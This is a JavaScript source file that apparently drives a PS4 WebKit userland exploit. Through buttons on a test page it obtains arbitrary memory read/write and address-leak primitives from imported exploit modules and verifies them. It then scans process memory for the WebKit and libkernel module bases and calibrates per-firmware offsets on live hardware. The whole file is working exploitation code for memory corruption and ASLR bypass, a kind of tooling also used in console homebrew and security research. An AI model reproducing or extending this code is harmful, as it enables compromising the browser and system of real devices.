import { establishPrimitive } from "./core.js";
import { installWindowP, pairStatus } from "./mem.js";
import { int64 } from "./int64.js";
import { offsetsFor, offsetsForKey } from "./ps4_offsets_userland.js";

const outEl = document.getElementById("out");
const stateEl = document.getElementById("state");
const fwSelect = document.getElementById("fw-select");
const btnEstablish = document.getElementById("btn-establish");
const btnOffsets = document.getElementById("btn-offsets");
const btnCalibrate = document.getElementById("btn-calibrate");
const btnAll = document.getElementById("btn-all");
const btnClear = document.getElementById("btn-clear");
const btnLowMem = document.getElementById("btn-lowmem");

const params = new URLSearchParams(location.search);
const lines = [];
let passCount = 0;
let failCount = 0;
let busy = false;
let primitiveDone = false;

const PRIMITIVE_LOUD = /FAIL|ERROR|THREW|RETRY|ABORT|PASS|GIVE-UP/i;

function mark(tag, detail) {
    const line = tag + (detail == null || detail === "" ? "" : "  " + detail);
    lines.push(line);
    const esc = t => String(t).replace(/&/g, "&amp;").replace(/</g, "&lt;");
    outEl.innerHTML = lines.map(l => esc(l)).join("\n");
    outEl.scrollTop = outEl.scrollHeight;
}

function state(msg, cls) {
    stateEl.textContent = msg;
    stateEl.className = cls || "";
}

function clearLog() {
    lines.length = 0;
    passCount = 0;
    failCount = 0;
    outEl.innerHTML = "";
}

function resolvedOffKey() {
    const pick = fwSelect.value;
    if (pick === "auto") {
        const detected = offsetsFor(navigator.userAgent);
        return detected.key || "13.00";
    }
    return pick;
}

function crossFw(offKey) {
    const detected = offsetsFor(navigator.userAgent);
    return detected.key && detected.key !== offKey;
}

function setUi() {
    const hasP = !!window.p;
    btnEstablish.disabled = busy || primitiveDone;
    btnOffsets.disabled = busy || !hasP;
    btnCalibrate.disabled = busy || !hasP;
    btnAll.disabled = busy || primitiveDone;
    btnClear.disabled = busy;
    fwSelect.disabled = busy || primitiveDone;
}

async function withBusy(fn) {
    if (busy) return;
    busy = true;
    setUi();
    try {
        await fn();
    } finally {
        busy = false;
        setUi();
    }
}

function check(name, ok, detail) {
    if (ok) {
        passCount++;
        mark("PASS", name + (detail ? "  " + detail : ""));
    } else {
        failCount++;
        mark("FAIL", name + (detail ? "  " + detail : ""));
    }
    return ok;
}

function same64(a, b) {
    return a.low === b.low && a.hi === b.hi;
}

function alignedModuleBase(v) {
    return v.hi > 0 && (v.low & 0x3fff) === 0;
}

function nativeExpm1(p, mFunctionOff) {
    const fnCell = p.leakval(Math.expm1);
    return p.read8(p.read8(fnCell.add32(0x18)).add32(mFunctionOff));
}

function bufAddr(p, off, ab) {
    const cell = p.leakval(ab);
    return p.read8(p.read8(cell.add32(off.wk_ArrayBuffer_m_impl))
        .add32(off.wk_ArrayBuffer_m_contents_m_data));
}

function findArrayBufferBacking(p, ab, expectLo) {
    const cell = p.leakval(ab);
    const implOffs = [0x8, 0x10, 0x18];
    const seen = new Set();
    const tryPtr = (label, ptr) => {
        const key = ptr.low + ":" + ptr.hi;
        if (seen.has(key) || ptr.hi === 0) return null;
        seen.add(key);
        try {
            if (p.read4(ptr).low === expectLo) return { label, ptr };
        } catch (_) { }
        return null;
    };

    for (let o = 0; o <= 0x40; o += 8) {
        const hit = tryPtr("cell+0x" + o.toString(16), p.read8(cell.add32(o)));
        if (hit) return hit;
    }
    for (const implOff of implOffs) {
        const impl = p.read8(cell.add32(implOff));
        if (impl.hi === 0) continue;
        for (let o = 0; o <= 0x40; o += 8) {
            const hit = tryPtr("impl@cell+0x" + implOff.toString(16) + "+0x"
                + o.toString(16), p.read8(impl.add32(o)));
            if (hit) return hit;
        }
    }
    return null;
}

function findWebkitBase(p, nativeFn) {
    for (let delta = 0; delta < 0x04000000; delta += 0x4000) {
        const base = nativeFn.sub32(delta);
        if (!alignedModuleBase(base)) continue;
        try {
            if (p.read4(base).low === 0x464c457f)
                return { base, wk_expm1_builtin: delta };
        } catch (_) { }
    }
    return null;
}

function findErrorImport(p, webkitBase, hintRva) {
    const hi = webkitBase.hi;
    const windows = hintRva
        ? [[Math.max(0, hintRva - 0x200000), hintRva + 0x200000]]
        : [[0x3800000, 0x3d00000], [0, 0x0200000]];
    for (const [start, end] of windows) {
        for (let rva = start; rva < end; rva += 8) {
            let ptr;
            try {
                ptr = p.read8(webkitBase.add32(rva));
            } catch (_) {
                continue;
            }
            if (ptr.hi <= hi || ptr.hi > hi + 4) continue;
            for (const kErr of [0x26420, 0xd9d0, 0x3370]) {
                const lk = ptr.sub32(kErr);
                if (!alignedModuleBase(lk)) continue;
                try {
                    const w0 = p.read4(lk).low;
                    const w1 = p.read4(lk.add32(4)).low;
                    if ((w0 & 0xff) === 0xb8 && (w1 & 0xffff) === 0x050f)
                        return { wk___imp___error: rva, k__error: kErr, libkernelBase: lk };
                } catch (_) { }
            }
        }
    }
    return null;
}

function calibrateOffsets(p, off) {
    mark("CALIBRATE", "scanning live module layout");
    const mFunctionOff = off.wk_JSFunction_m_function || 0x28;
    const nativeFn = nativeExpm1(p, mFunctionOff);
    mark("CAL-NATIVEFN", String(nativeFn));

    const wk = findWebkitBase(p, nativeFn);
    if (!wk) {
        mark("CALIBRATE-FAIL", "webkit base not found via ELF scan");
        return null;
    }
    mark("CAL-WK-BASE", String(wk.base));
    mark("CAL-wk_expm1_builtin", "0x" + wk.wk_expm1_builtin.toString(16));

    const err = findErrorImport(p, wk.base, off.wk___imp___error);
    if (err) {
        mark("CAL-wk___imp___error", "0x" + err.wk___imp___error.toString(16));
        mark("CAL-k__error", "0x" + err.k__error.toString(16));
        mark("CAL-LK-BASE", String(err.libkernelBase));
    } else {
        mark("CALIBRATE-WARN", "__imp___error not found");
    }

    return Object.assign({
        wk_JSFunction_m_function: mFunctionOff,
        wk_ArrayBuffer_m_impl: off.wk_ArrayBuffer_m_impl,
        wk_ArrayBuffer_m_contents_m_data: off.wk_ArrayBuffer_m_contents_m_data,
    }, { wk_expm1_builtin: wk.wk_expm1_builtin }, err || {});
}

function logBootInfo() {
    const detected = offsetsFor(navigator.userAgent);
    mark("UA", navigator.userAgent);
    mark("UA-FW", detected.key || "unknown");
    if (params.has("g"))
        mark("BOOT", "groom override: " + params.getAll("g").join(", "));
    else
        mark("BOOT", "default groom — use low-mem reload if OOM");
}

async function runEstablish() {
    if (primitiveDone) {
        mark("SKIP", "primitive already established this page");
        return;
    }

    state("establishing primitive...", "warn");
    mark("STEP", "1 · get primitive");

    const carrier = await establishPrimitive({
        maxAttempts: 1,
        onEvent: (t, d, a) => (PRIMITIVE_LOUD.test(t) ? mark : () => {})
            (t, (a != null ? "[" + a + "] " : "") + (d || ""))
    });

    installWindowP(carrier, {
        promote: false,
        onEvent: (t, d) => (PRIMITIVE_LOUD.test(t) ? mark : () => {})(t, d || "")
    });

    const p = window.p;
    if (!p) throw new Error("window.p was not installed");

    primitiveDone = true;
    mark("PAIR-STATUS", "state=" + pairStatus.state
        + " promoted=" + pairStatus.promoted);
    mark("PRIMITIVE-OK", "window.p read/write/leakval live");

    const boxA = { tag: "A" };
    const boxB = { tag: "B" };
    const addrA = p.leakval(boxA);
    const addrB = p.leakval(boxB);
    check("leakval-distinct",
        !same64(addrA, addrB) && addrA.low !== 0 && addrB.low !== 0,
        "a=" + addrA + " b=" + addrB);

    const headerA = p.read8(addrA);
    p.write8(addrA, headerA);
    check("read8-write8-roundtrip-header", same64(p.read8(addrA), headerA), "");

    state("primitive OK — run step 2 or 3", "ok");
    mark("READY", "offset tests and calibrate unlocked");
}

async function runOffsetTests() {
    const p = window.p;
    if (!p) throw new Error("run step 1 first");

    const offKey = resolvedOffKey();
    const { off } = offsetsForKey(offKey);
    if (!off) throw new Error("no offset table for fw=" + offKey);

    mark("STEP", "2 · offset tests");
    mark("OFFSETS-FW", offKey);
    mark("OFFSETS", off.fw_status || "loaded");
    if (crossFw(offKey))
        mark("NOTE", "UA FW != offset table — fails here are expected");

    state("offset tests...", "warn");

    const probe = new ArrayBuffer(0x20);
    const view = new Uint32Array(probe);
    view[0] = 0xdeadbeef;
    view[1] = 0xcafebabe;

    let offsetFail = 0;
    const checkOffset = (name, ok, detail) => {
        if (ok) {
            passCount++;
            mark("PASS", name + (detail ? "  " + detail : ""));
        } else {
            failCount++;
            offsetFail++;
            mark(crossFw(offKey) ? "FAIL-OFFSET" : "FAIL", name + (detail ? "  " + detail : ""));
        }
        return ok;
    };

    const backing = findArrayBufferBacking(p, probe, 0xdeadbeef);
    if (backing)
        mark("AB-BACKING", backing.label + " -> " + backing.ptr);

    const dataPtr = backing ? backing.ptr : bufAddr(p, off, probe);
    checkOffset("arraybuffer-data-plausible", dataPtr.hi > 0, "ptr=" + dataPtr);
    const got = p.read4(dataPtr);
    checkOffset("arraybuffer-read4",
        got.low === 0xdeadbeef,
        "got=0x" + got.toString(16) + " ptr=" + dataPtr);
    if (got.low === 0xdeadbeef) {
        p.write4(dataPtr, new int64(0x13371337, 0));
        checkOffset("arraybuffer-write4",
            view[0] === 0x13371337,
            "view[0]=" + view[0].toString(16));
    }

    if (off.wk_expm1_builtin) {
        const nativeFn = nativeExpm1(p, off.wk_JSFunction_m_function);
        const webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
        const errorFn = p.read8(webkitBase.add32(off.wk___imp___error));
        const libkernelBase = errorFn.sub32(off.k__error);
        mark("BASES", "webkit=" + webkitBase + " libkernel=" + libkernelBase
            + " nativeFn=" + nativeFn);
        checkOffset("module-bases-0x4000-aligned",
            alignedModuleBase(webkitBase) && alignedModuleBase(libkernelBase), "");
    }

    const summary = passCount + " pass, " + failCount + " fail";
    state("offset tests done — " + summary, offsetFail ? "warn" : "ok");
    mark("DONE-OFFSETS", summary);
}

async function runCalibrate() {
    const p = window.p;
    if (!p) throw new Error("run step 1 first");

    const offKey = resolvedOffKey();
    const { off } = offsetsForKey(offKey);
    if (!off) throw new Error("no offset table for fw=" + offKey);

    mark("STEP", "3 · calibrate wk_*");
    mark("OFFSETS-FW", offKey + " (hint for __imp___error scan)");
    state("calibrating...", "warn");

    const live = calibrateOffsets(p, off);
    if (live && live.wk_expm1_builtin != null) {
        mark("PASTE-OFFSETS", JSON.stringify({
            fw_status: "calibrated on hardware",
            wk_expm1_builtin: live.wk_expm1_builtin,
            wk_JSFunction_m_function: live.wk_JSFunction_m_function,
            wk___imp___error: live.wk___imp___error,
            k__error: live.k__error,
            wk_ArrayBuffer_m_impl: live.wk_ArrayBuffer_m_impl,
            wk_ArrayBuffer_m_contents_m_data: live.wk_ArrayBuffer_m_contents_m_data,
        }, null, 0));
    }

    state("calibrate done", "ok");
    mark("DONE-CALIBRATE", "");
}

function wireButton(el, handler) {
    el.addEventListener("click", () => {
        withBusy(async () => {
            try {
                await handler();
            } catch (err) {
                state("error: " + err.message, "bad");
                mark("ERROR", err.stack || err.message);
            }
        });
    });
}

wireButton(btnEstablish, runEstablish);
wireButton(btnOffsets, runOffsetTests);
wireButton(btnCalibrate, runCalibrate);
wireButton(btnAll, async () => {
    await runEstablish();
    await runOffsetTests();
});

btnClear.addEventListener("click", () => {
    if (busy) return;
    clearLog();
    logBootInfo();
    state(primitiveDone ? "primitive OK — pick a test" : "ready", primitiveDone ? "ok" : "");
});

btnLowMem.addEventListener("click", () => {
    const url = new URL(location.href);
    url.searchParams.set("g", "drain:384");
    location.href = url.toString();
});

if (params.get("fw") && fwSelect.querySelector(`option[value="${params.get("fw")}"]`))
    fwSelect.value = params.get("fw");

state("ready — tap step 1", "");
logBootInfo();
setUi();
